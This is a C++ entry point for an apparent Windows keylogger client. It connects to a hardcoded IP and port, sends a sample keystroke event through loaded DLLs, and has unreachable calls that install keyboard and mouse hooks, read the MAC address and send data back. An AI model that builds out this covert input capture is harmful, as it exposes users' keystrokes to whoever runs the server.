#include <windows.h>
#include <iostream>
#include "Client.h"
#include "DynamicLinkLibrary.hpp"
#include "../../include/lib/ITime.hpp"
#include "../../include/lib/ISocket.hpp"
#include "../../include/lib/IProtocol.hpp"

Client clt;

int main(int ac, char **av)
{
	DynamicLinkLibrary time("Time_Windows.dll");
	fct_new_itime new_time = time.get_symbole<fct_new_itime>(NAME_FCT_NEW_ITIME);
	ITime &lol = new_time();
	DynamicLinkLibrary socket("Socket_Windows.dll");
	fct_iselect	iselect = socket.get_symbole<fct_iselect>(NAME_FCT_ISELECT);
	fct_new_iclient new_client = socket.get_symbole<fct_new_iclient>(NAME_FCT_NEW_ICLIENT);
	ISocket &xd = new_client("10.26.112.79", "4242");
	DynamicLinkLibrary protocol("protocolv1.dll");
	fct_new_iprotocol new_protocol = protocol.get_symbole<fct_new_iprotocol>(NAME_FCT_NEW_IPROTOCOL);
	IProtocol &mdr = new_protocol(xd, lol);

	IProtocol::Keyboard	keyboard = {lol, "press", "ff", "rio.exe" };
	std::list<IProtocol::Keyboard *>	ptdr;
	ptdr.push_back(&keyboard);
	mdr.keyboard(ptdr);
	while (true)
	{
		std::cout << "je suis la" << std::endl;
		mdr.select();
		iselect(nullptr);
		std::cout << "finis select" << std::endl;
		if (mdr.run() == true)
			return (0);
	}
	return (1);
	clt.getMACAddress();

	clt.setKeyboardHook();
	clt.setMouseHook();
	clt.sendBackMessage();
	return (0);
}